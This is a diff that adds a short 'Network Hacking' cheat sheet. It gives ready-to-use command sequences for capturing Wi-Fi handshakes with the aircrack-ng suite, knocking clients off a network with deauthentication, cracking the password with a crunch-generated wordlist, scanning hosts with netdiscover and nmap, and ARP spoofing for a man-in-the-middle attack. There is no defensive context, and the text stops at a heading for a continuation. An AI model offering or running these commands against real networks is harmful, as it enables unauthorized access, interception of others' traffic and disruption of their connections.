@@ -1,0 +1,38 @@
+-- Network Hacking --
+
+▶ Wifi Hacking:
+
+iwconfig
+ifconfig wlan0 down
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng --bssid <MAC> --channel <CH> --write Filename wlan0
+aireplay-ng --deauth 0 -a <MAC> -c <Client_MAC> wlan0
+
+<Restart Your Vmware>
+aircrack-ng "cap file path" -w "pass file" wlan0
+
+▶ Create a Wordlist: crunch <min> <max> <character> -t <pattern> -o <name.txt>
+
+▶ After connecting a Network you can also use fing
+
+sudo netdiscover -i wlan0 -r 192.168.1.0/24
+nmap -sn 192.168.1.1/24
+nmap -T4 -F 192.168.1.1/24
+nmap -SV -T4 -O -F --version-light 192.168.1.1/24
+ssh user@ip >> password
+
+▶ MITM Attack
+
+* arp Spoofing:
+arp -a
+arpspoof -i <interface> -t <clientip> <gatewayip>
+arpspoof -i <interface> -t <gatewayip> <clientip>
+
+
+
+
+
+-- Network Hacking Continued - Intermediate to Advanced --
